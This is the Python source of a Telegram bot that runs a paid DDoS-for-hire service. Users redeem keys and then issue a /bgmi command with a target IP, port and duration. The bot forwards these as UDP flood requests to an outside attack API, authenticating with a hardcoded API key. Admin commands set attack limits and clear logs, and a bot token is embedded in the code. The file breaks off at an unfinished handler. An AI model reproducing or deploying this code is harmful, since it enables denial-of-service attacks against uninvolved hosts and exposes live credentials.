import telebot
import subprocess
import datetime
import os
import random
import string
import json
import requests
import time
import sys
import logging
# Setup logging to show in terminal
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# Insert your Telegram bot token here
bot = telebot.TeleBot('8604674269:AAGOa1EuknuNM87CE5ZrWWGdJbn0dbLLpHQ')
# Admin user IDs (all as integers for proper comparison)
admin_id = {5231119862,6665217160}
# API Configuration
API_URL = "http://app.teamc2.xyz/api/attack"
API_KEY = "HTQU5R"
# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
CONFIG_FILE = "config.json"
# Default settings (can be changed via admin commands)
DEFAULT_CONFIG = {
    "max_attack_time": 240,  # Maximum attack duration in seconds
    "global_max_concurrent": 1,  # Maximum concurrent attacks globally
    "user_cooldown_time": 100,  # User cooldown in seconds
    "global_cooldown_time": 5,  # Global cooldown in seconds
    "consecutive_attacks_limit": 1,
    "consecutive_attacks_cooldown": 100
}

# Load config
def load_config():
    try:
        with open(CONFIG_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        save_config(DEFAULT_CONFIG)
        return DEFAULT_CONFIG

def save_config(config):
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file, indent=4)
# Initialize config
config = load_config()

# Global attack tracking
global_attack_active = 0  # Counter for active attacks
global_attack_lock = False
global_last_attack_time = 0
current_attack_info = []
attack_processes = {}  # Track active attacks with their details

# In-memory storage
users = {}
keys = {}
user_cooldown = {}
consecutive_attacks = {}
# Read users and keys from files initially
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def log_command(user_id, target, port, time_duration):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_duration}\n\n")
    
    logger.info(f"ATTACK LOG - User: {username} | Target: {target} | Port: {port} | Duration: {time_duration}s")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "𝐋𝐨𝐠𝐬 𝐰𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝"
            else:
                file.truncate(0)
                return "𝐅𝐮𝐜𝐤𝐞𝐝 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲✅"
    except FileNotFoundError:
        return "𝐋𝐨𝐠𝐬 𝐖𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝."

  
def record_command_logs(user_id, command, target=None, port=None, time_duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time_duration:
        log_entry += f" | Time: {time_duration}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

def send_attack_via_api(target, port, time_duration, user_id):
    """Send attack request via the API"""
    attack_info = f"Target: {target}:{port} | Duration: {time_duration}s | User: {user_id}"
    current_attack_info.append(attack_info)
    attack_id = len(current_attack_info) - 1
    
    try:
        params = {
            'key': API_KEY,
            'host': target,
            'port': port,
            'time': time_duration,
            'method': 'UDP'
       }
        
        logger.info(f"🚀 ATTACK STARTED - {attack_info}")
        
        response = requests.get(API_URL, params=params, timeout=10)
        
        logger.info(f"📡 API Response - Status: {response.status_code}")
        logger.info(f"📡 Response Body: {response.text[:500] if response.text else 'Empty'}")
        
        if response.status_code == 200:
            try:
                response_data = response.json()
                logger.info(f"✅ ATTACK SUCCESS - {attack_info}")
                return True, response_data, attack_id
            except:
                logger.info(f"✅ ATTACK SUCCESS - {attack_info}")
                return True, {"message": "Attack sent successfully"}, attack_id
        else:
            logger.error(f"❌ ATTACK FAILED - {attack_info} | HTTP {response.status_code}")
            return False, f"HTTP {response.status_code}", attack_id
            
    except requests.exceptions.Timeout:
        logger.error(f"⏰ ATTACK TIMEOUT - {attack_info}")
        return False, "Request timeout", attack_id
    except requests.exceptions.ConnectionError:
        logger.error(f"🔌 CONNECTION ERROR - {attack_info}")
        return False, "Connection failed", attack_id
    except Exception as e:
        logger.error(f"💥 ATTACK ERROR - {attack_info} | {str(e)}")
        return False, f"Error: {str(e)}", attack_id

def run_bot_forever():
    """Run bot with infinite retry on error"""
    while True:
        try:
            logger.info("🤖 Bot started successfully!")
            logger.info(f"🌐 Max Attack Time: {config['max_attack_time']}s")
            logger.info(f"🌐 Max Concurrent Attacks: {config['global_max_concurrent']}")
            logger.info(f"🌐 User Cooldown: {config['user_cooldown_time']}s | Global Cooldown: {config['global_cooldown_time']}s")
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            logger.error(f"❌ Bot crashed: {str(e)}")
            logger.info("🔄 Restarting bot in 5 seconds...")
            time.sleep(5)
            continue

@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    user_id = message.chat.id
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            try:
                time_amount = int(command[1])
                time_unit = command[2].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"𝐊𝐞𝐲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧: {key}\n𝐄𝐬𝐩𝐢𝐫𝐞𝐬 𝐎𝐧: {expiration_date}"
                logger.info(f"Admin {user_id} generated key: {key}")
            except ValueError:
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐩𝐞𝐜𝐢𝐟𝐲 𝐀 𝐕𝐚𝐥𝐢𝐝 𝐍𝐮𝐦𝐛𝐞𝐫 𝐚𝐧𝐝 𝐮𝐧𝐢𝐭 𝐨𝐟 𝐓𝐢𝐦𝐞 (hours/days)."
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /genkey <amount> <hours/days>"
    else:
        response = "𝑶𝒏𝒍𝒚 𝑨𝒅𝒎𝒊𝒏 𝑪𝒂𝒏 𝑹𝒖𝒏 𝑻𝒉𝒊𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅."

    bot.reply_to(message, response)

@bot.message_handler(commands=['redeem'])
def redeem_key_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        key = command[1]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅𝐊𝐞𝐲 𝐫𝐞𝐝𝐞𝐞𝐦𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲! 𝐀𝐜𝐜𝐞𝐬𝐬 𝐆𝐫𝐚𝐧𝐭𝐞𝐝 𝐔𝐧𝐭𝐢𝐥𝐥: {users[user_id]}"
            logger.info(f"User {user_id} redeemed key: {key}")
        else:
            response = "𝐄𝐱𝐩𝐢𝐫𝐞 𝐊𝐞𝐘 𝐌𝐚𝐭 𝐃𝐚𝐚𝐋 𝐋𝐚𝐰𝐝𝐞 ."
    else:
        response = "𝐔𝐬𝐚𝐠𝐞: /redeem <key>"

    bot.reply_to(message, response)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global global_attack_active, global_attack_lock, global_last_attack_time
    
    user_id_int = message.chat.id
    user_id = str(user_id_int)
    current_time = time.time()
    
    max_concurrent = config['global_max_concurrent']
    max_time = config['max_attack_time']
    user_cooldown_time = config['user_cooldown_time']
    global_cooldown_time = config['global_cooldown_time']
    
    # Check if maximum concurrent attacks reached
    if global_attack_active >= max_concurrent:
        response = f"⚠️ 𝐌𝐚𝐱𝐢𝐦𝐮𝐦 {max_concurrent} 𝐚𝐭𝐭𝐚𝐜𝐤(𝐬) 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬! 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭. ⚠️"
        bot.reply_to(message, response)
        return
      
    # Check global cooldown (between attacks)
    time_since_last_global = current_time - global_last_attack_time
    if time_since_last_global < global_cooldown_time and global_last_attack_time > 0:
        remaining = int(global_cooldown_time - time_since_last_global)
        response = f"🌐 𝐆𝐥𝐨𝐛𝐚𝐥 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐚𝐜𝐭𝐢𝐯𝐞! 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 {remaining} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬. 🌐"
        bot.reply_to(message, response)
        return
    
    # Check if user has access
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❌ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐆𝐨𝐓 𝐅𝐮𝐂𝐤𝐞𝐝 𝐆𝐞𝐍 𝐧𝐄𝐰 𝐊𝐞𝐘 𝐀𝐧𝐝 𝐫𝐞𝐝𝐞𝐞𝐌-> using /redeem <key> ❌"
            bot.reply_to(message, response)
            return
        
        # User cooldown check (admins bypass user cooldown but NOT global cooldown)
        if user_id_int not in admin_id:
            if user_id in user_cooldown:
                time_since_last_user = current_time - user_cooldown[user_id]
                if time_since_last_user < user_cooldown_time:
                    cooldown_remaining = int(user_cooldown_time - time_since_last_user)
                    response = f"⏰ 𝐔𝐬𝐞𝐫 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧! 𝐖𝐚𝐢𝐭 {cooldown_remaining} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬. ⏰"
                    bot.reply_to(message, response)
                    return
            
            # Consecutive attacks check
            if consecutive_attacks.get(user_id, 0) >= config['consecutive_attacks_limit']:
                if time_since_last_user < config['consecutive_attacks_cooldown']:
                    cooldown_remaining = config['consecutive_attacks_cooldown'] - int(time_since_last_user)
                    response = f"⚠️ 𝐂𝐨𝐧𝐬𝐞𝐜𝐮𝐭𝐢𝐯𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 𝐥𝐢𝐦𝐢𝐭 𝐫𝐞𝐚𝐜𝐡𝐞𝐝! 𝐖𝐚𝐢𝐭 {cooldown_remaining} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬. ⚠️"
                    bot.reply_to(message, response)
                    return
                else:
                    consecutive_attacks[user_id] = 0

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            try:
                port = int(command[2])
                time_duration = int(command[3])
                if time_duration > max_time:
                    response = f"⚠️ 𝐄𝐑𝐑𝐎𝐑: 𝐌𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐢𝐬 {max_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬."
                    bot.reply_to(message, response)
                    return
                
                # Increment active attacks counter
                global_attack_active += 1
                
                # Update user cooldown and consecutive attacks
                user_cooldown[user_id] = current_time
                consecutive_attacks[user_id] = consecutive_attacks.get(user_id, 0) + 1
                
                # Send attack response to user
                attack_start_msg = f"✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 ✅\n\n🎮 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time_duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n⚡ 𝐀𝐭𝐭𝐚𝐜𝐤 #{global_attack_active} 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬..."
                bot.reply_to(message, attack_start_msg)
                
                # Log to terminal
                logger.info(f"📝 New attack request from User: {user_id} (Active attacks: {global_attack_active}/{max_concurrent})")
                
                # Execute attack
                success, api_response, attack_id = send_attack_via_api(target, port, time_duration, user_id)
                
                # Record logs
                record_command_logs(user_id, '/bgmi', target, port, time_duration)
                log_command(user_id_int, target, port, time_duration)
                
                # Track the attack process
                attack_processes[attack_id] = {
                    'user_id': user_id,
                    'target': target,
                    'port': port,
                    'time_duration': time_duration,
                    'start_time': current_time
            }
                              
                # Wait for attack duration in a non-blocking way using threading
                import threading
                def wait_and_complete():
                    global global_attack_active, global_last_attack_time
                    time.sleep(time_duration)
                    global_attack_active -= 1
                    global_last_attack_time = time.time()
                    
                    # Clean up
                    if attack_id in attack_processes:
                        del attack_processes[attack_id]
                    if attack_info in current_attack_info:
                        current_attack_info.remove(attack_info)
                    
                    # Send completion message
                    completion_msg = f"✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃 ✅\n\n🎮 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time_duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n💥 𝐀𝐭𝐭𝐚𝐜𝐤 𝐟𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲!"
                    
                    if not success:
                        completion_msg += "\n\n⚠️ 𝐖𝐚𝐫𝐧𝐢𝐧𝐠: 𝐀𝐭𝐭𝐚𝐜𝐤 𝐦𝐚𝐲 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐢𝐧𝐭𝐞𝐫𝐫𝐮𝐩𝐭𝐞𝐝"
                    
                    try:
                        bot.send_message(user_id_int, completion_msg)
                    except:
                        pass
                    
                    logger.info(f"✅ Attack completed. Active attacks: {global_attack_active}/{max_concurrent}")
                
                # Start the completion thread
                completion_thread = threading.Thread(target=wait_and_complete)
                completion_thread.daemon = True
                completion_thread.start()
                
            except ValueError:
                global_attack_active -= 1
                response = "𝐄𝐑𝐑𝐎𝐑» 𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐇𝐈𝐊 𝐒𝐄 𝐃𝐀𝐀𝐋 𝐂𝐇𝐔𝐓𝐘𝐄"
                bot.reply_to(message, response)
        else:
            response = f"𝐔𝐒𝐀𝐆𝐄: /𝐛𝐠𝐦𝐢 <𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>\n𝐌𝐀𝐗 𝐓𝐈𝐌𝐄: {max_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
            bot.reply_to(message, response)
    else:
        response = "💢 𝐎𝐧𝐥𝐲 𝐏𝐚𝐢𝐝 𝐌𝐞𝐦𝐛𝐞𝐫𝐬 𝐂𝐚𝐧 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 💢\n𝐂𝐨𝐧𝐭𝐚𝐜𝐭 @𝐀𝐝𝐦𝐢𝐧 𝐭𝐨 𝐠𝐞𝐭 𝐚𝐜𝐜𝐞𝐬𝐬"
        bot.reply_to(message, response)

@bot.message_handler(commands=['status'])
def show_status(message):
    """Show current attack status - Available for all users"""
    user_id = message.chat.id
    user_id_str = str(user_id)
    
    current_time = time.time()
    max_concurrent = config['global_max_concurrent']
    max_time = config['max_attack_time']
    user_cooldown_time = config['user_cooldown_time']
    global_cooldown_time = config['global_cooldown_time']
    
    # Common status info for all users
    status = "📊 **𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒**\n\n"
    status += "=" * 30 + "\n"
    
    # Attack status section
    if global_attack_active > 0:
        status += f"🔴 **{global_attack_active} 𝐀𝐓𝐓𝐀𝐂𝐊(𝐒) 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒**\n"
        # Show detailed info to admins only
        if user_id in admin_id:
            for attack_info in current_attack_info:
                status += f"📡 {attack_info}\n"
            status += f"\n🔧 Active/Allowed: {global_attack_active}/{max_concurrent}\n"
        else:
            status += f"⏳ {global_attack_active} attack(s) running. Available: {max_concurrent - global_attack_active}\n"
    else:
        time_since_last = current_time - global_last_attack_time if global_last_attack_time > 0 else 999
        if time_since_last < global_cooldown_time:
            remaining = int(global_cooldown_time - time_since_last)
            status += f"🟡 **𝐆𝐋𝐎𝐁𝐀𝐋 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐀𝐂𝐓𝐈𝐕𝐄**\n"
            status += f"⏱️ {remaining}s remaining until next attack\n"
        else:
            status += "🟢 **𝐒𝐘𝐒𝐓𝐄𝐌 𝐑𝐄𝐀𝐃𝐘**\n"
            status += f"✅ {max_concurrent} attack(s) available\n"
    
    # User-specific info
    status += "\n" + "=" * 30 + "\n"
    status += "👤 **𝐘𝐎𝐔𝐑 𝐒𝐓𝐀𝐓𝐔𝐒**\n"
    
    # Check if user has access
    if user_id_str in users:
        expiration_date = datetime.datetime.strptime(users[user_id_str], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            status += "❌ Your access has EXPIRED\n"
            status += f"📅 Expired on: {users[user_id_str]}\n"
            status += "💡 Contact admin to renew\n"
        else:
            time_remaining = expiration_date - datetime.datetime.now()
            days = time_remaining.days
            hours = time_remaining.seconds // 3600
            minutes = (time_remaining.seconds % 3600) // 60
            status += "✅ Your access: ACTIVE\n"
            status += f"📅 Expires in: {days}d {hours}h {minutes}m\n"
            
            # Show user cooldown info
            if user_id_str in user_cooldown:
                time_since_last_user = current_time - user_cooldown[user_id_str]
                if time_since_last_user < user_cooldown_time:
                    remaining = int(user_cooldown_time - time_since_last_user)
                    status += f"⏰ Your cooldown: {remaining}s remaining\n"
                else:
                    status += "⏰ Your cooldown: Ready ✅\n"
            else:
                status += "⏰ Your cooldown: Ready ✅\n"
                
            # Show consecutive attacks info
            user_attacks = consecutive_attacks.get(user_id_str, 0)
            status += f"🔄 Attacks used: {user_attacks}/{config['consecutive_attacks_limit']}\n"
            
            # Count user's active attacks
            user_active = sum(1 for p in attack_processes.values() if p['user_id'] == user_id_str)
            if user_active > 0:
                status += f"⚡ Your active attacks: {user_active}\n"
    else:
        if user_id in admin_id:
            status += "👑 Admin Access\n"
        else:
            status += "❌ No access\n"
            status += "💡 Use /redeem <key> to get access\n"
    
    # Admin section (only visible to admins)
    if user_id in admin_id:
        status += "\n" + "=" * 30 + "\n"
        status += "👑 **𝐀𝐃𝐌𝐈𝐍 𝐈𝐍𝐅𝐎**\n"
        
        # Active users count
        active_users = 0
        for uid, exp in users.items():
            try:
                exp_date = datetime.datetime.strptime(exp, '%Y-%m-%d %H:%M:%S')
                if datetime.datetime.now() < exp_date:
                    active_users += 1
            except:
                pass
                      
        status += f"📈 Total Registered: {len(users)}\n"
        status += f"✅ Active Users: {active_users}\n"
        status += f"🔑 Available Keys: {len(keys)}\n"
        status += f"⚔️ Active Attacks: {global_attack_active}/{max_concurrent}\n"
        
        # Current settings
        status += "\n" + "=" * 30 + "\n"
        status += "⚙️ **𝐂𝐔𝐑𝐑𝐄𝐍𝐓 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒**\n"
        status += f"⏱️ Max Attack Time: {max_time}s\n"
        status += f"🔢 Max Concurrent: {max_concurrent}\n"
        status += f"👤 User Cooldown: {user_cooldown_time}s\n"
        status += f"🌐 Global Cooldown: {global_cooldown_time}s\n"
        status += f"🔄 Consecutive Limit: {config['consecutive_attacks_limit']}\n"
        status += f"⏰ Consecutive Cooldown: {config['consecutive_attacks_cooldown']}s\n"
        
        # Show active attack details
        if attack_processes:
            status += "\n" + "=" * 30 + "\n"
            status += "🎯 **𝐀𝐂𝐓𝐈𝐕𝐄 𝐀𝐓𝐓𝐀𝐂𝐊𝐒**\n"
            for aid, pinfo in attack_processes.items():
                elapsed = int(current_time - pinfo['start_time'])
                remaining = pinfo['time_duration'] - elapsed
                status += f"#{aid}: {pinfo['target']}:{pinfo['port']} | Remaining: {remaining}s | User: {pinfo['user_id']}\n"
    
    status += f"\n🕐 Checked: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    bot.reply_to(message, status)
    logger.info(f"User {user_id} checked status")

@bot.message_handler(commands=['setmaxconcurrent'])
def set_max_concurrent(message):
    """Admin command to set maximum concurrent attacks"""
    user_id = message.chat.id
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            try:
                new_max = int(command[1])
                if new_max < 1:
                    response = "⚠️ 𝐌𝐚𝐱 𝐜𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚𝐭 𝐥𝐞𝐚𝐬𝐭 𝟏"
                elif new_max > 10:
                    response = "⚠️ 𝐌𝐚𝐱 𝐜𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐜𝐚𝐧𝐧𝐨𝐭 𝐞𝐱𝐜𝐞𝐞𝐝 𝟏𝟎"
                else:
                    old_max = config['global_max_concurrent']
                    config['global_max_concurrent'] = new_max
                    save_config(config)
                    response = f"✅ 𝐌𝐚𝐱 𝐜𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐮𝐩𝐝𝐚𝐭𝐞𝐝: {old_max} → {new_max}"
                    logger.info(f"Admin {user_id} changed max concurrent attacks from {old_max} to {new_max}")
            except ValueError:
                response = "𝐔𝐬𝐚𝐠𝐞: /setmaxconcurrent <number>"
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /setmaxconcurrent <number>"
    else:
        response = "𝑶𝒏𝒍𝒚 𝑨𝒅𝒎𝒊𝒏 𝑪𝒂𝒏 𝑹𝒖𝒏 𝑻𝒉𝒊𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅."
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['setmaxtime'])
def set_max_time(message):
    """Admin command to set maximum attack time"""
    user_id = message.chat.id
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            try:
                new_time = int(command[1])
                if new_time < 10:
                    response = "⚠️ 𝐌𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚𝐭 𝐥𝐞𝐚𝐬𝐭 𝟏𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
                elif new_time > 600:
                    response = "⚠️ 𝐌𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐜𝐚𝐧𝐧𝐨𝐭 𝐞𝐱𝐜𝐞𝐞𝐝 𝟔𝟎𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
                else:
                    old_time = config['max_attack_time']
                    config['max_attack_time'] = new_time
                    save_config(config)
                    response = f"✅ 𝐌𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐮𝐩𝐝𝐚𝐭𝐞𝐝: {old_time}s → {new_time}s"
                    logger.info(f"Admin {user_id} changed max attack time from {old_time}s to {new_time}s")
            except ValueError:
                response = "𝐔𝐬𝐚𝐠𝐞: /setmaxtime <seconds>"
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /setmaxtime <seconds>"
    else:
        response = "𝑶𝒏𝒍𝒚 𝑨𝒅𝒎𝒊𝒏 𝑪𝒂𝒏 𝑹𝒖𝒏 𝑻𝒉𝒊𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅."
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['setusercooldown'])
def set_user_cooldown(message):
    """Admin command to set user cooldown time"""
    user_id = message.chat.id
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            try:
                new_cooldown = int(command[1])
                if new_cooldown < 0:
                    response = "⚠️ 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐜𝐚𝐧𝐧𝐨𝐭 𝐛𝐞 𝐧𝐞𝐠𝐚𝐭𝐢𝐯𝐞"
                elif new_cooldown > 600:
                    response = "⚠️ 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐜𝐚𝐧𝐧𝐨𝐭 𝐞𝐱𝐜𝐞𝐞𝐝 𝟔𝟎𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
                else:
                    old_cooldown = config['user_cooldown_time']
                    config['user_cooldown_time'] = new_cooldown
                    save_config(config)
                    response = f"✅ 𝐔𝐬𝐞𝐫 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐮𝐩𝐝𝐚𝐭𝐞𝐝: {old_cooldown}s → {new_cooldown}s"
                    logger.info(f"Admin {user_id} changed user cooldown from {old_cooldown}s to {new_cooldown}s")
            except ValueError:
                response = "𝐔𝐬𝐚𝐠𝐞: /setusercooldown <seconds>"
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /setusercooldown <seconds>"
    else:
        response = "𝑶𝒏𝒍𝒚 𝑨𝒅𝒎𝒊𝒏 𝑪𝒂𝒏 𝑹𝒖𝒏 𝑻𝒉𝒊𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅."
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['setglobalcooldown'])
def set_global_cooldown(message):
    """Admin command to set global cooldown time"""
    user_id = message.chat.id
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            try:
                new_cooldown = int(command[1])
                if new_cooldown < 0:
                    response = "⚠️ 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐜𝐚𝐧𝐧𝐨𝐭 𝐛𝐞 𝐧𝐞𝐠𝐚𝐭𝐢𝐯𝐞"
                elif new_cooldown > 60:
                    response = "⚠️ 𝐆𝐥𝐨𝐛𝐚𝐥 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐜𝐚𝐧𝐧𝐨𝐭 𝐞𝐱𝐜𝐞𝐞𝐝 𝟔𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
                else:
                    old_cooldown = config['global_cooldown_time']
                    config['global_cooldown_time'] = new_cooldown
                    save_config(config)
                    response = f"✅ 𝐆𝐥𝐨𝐛𝐚𝐥 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐮𝐩𝐝𝐚𝐭𝐞𝐝: {old_cooldown}s → {new_cooldown}s"
                    logger.info(f"Admin {user_id} changed global cooldown from {old_cooldown}s to {new_cooldown}s")
            except ValueError:
                response = "𝐔𝐬𝐚𝐠𝐞: /setglobalcooldown <seconds>"
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /setglobalcooldown <seconds>"
    else:
        response = "𝑶𝒏𝒍𝒚 𝑨𝒅𝒎𝒊𝒏 𝑪𝒂𝒏 𝑹𝒖𝒏 𝑻𝒉𝒊𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅."
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = message.chat.id
    if user_id in admin_id:
        response = clear_logs()
        logger.info(f"Admin {user_id} cleared logs")
    else:
        response = "𝐀𝐁𝐄 𝐆𝐀𝐍𝐃𝐔 𝐉𝐈𝐒𝐊𝐀 𝐁𝐎𝐓 𝐇 𝐖𝐀𝐇𝐈 𝐔𝐒𝐄 𝐊𝐑 𝐒𝐊𝐓𝐀 𝐄𝐒𝐄 𝐁𝐀𝐒."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = message.chat.id
    if user_id in admin_id:
        if users:
            response = "𝐂𝐇𝐔𝐓𝐘𝐀 𝐔𝐒𝐑𝐄𝐑 𝐋𝐈𝐒𝐓:\n"
            for user_id_str, expiration_date in users.items():
                try:
                    user_info = bot.get_chat(int(user_id_str))
                    username = user_info.username if user_info.username else f"UserID: {user_id_str}"
                    response += f"- @{username} (ID: {user_id_str}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- 𝐔𝐬𝐞𝐫 𝐢𝐝: {user_id_str} 𝐄𝐱𝐩𝐢𝐫𝐞𝐬 𝐨𝐧 {expiration_date}\n"
        else:
            response = "𝐀𝐣𝐢 𝐋𝐚𝐧𝐝 𝐌𝐞𝐫𝐚"
    else:
        response = "𝐁𝐇𝐀𝐆𝐉𝐀 𝐁𝐒𝐃𝐊 𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐀𝐓"
    bot.reply_to(message, response)
  
@bot.message_handler(commands=['logs'])
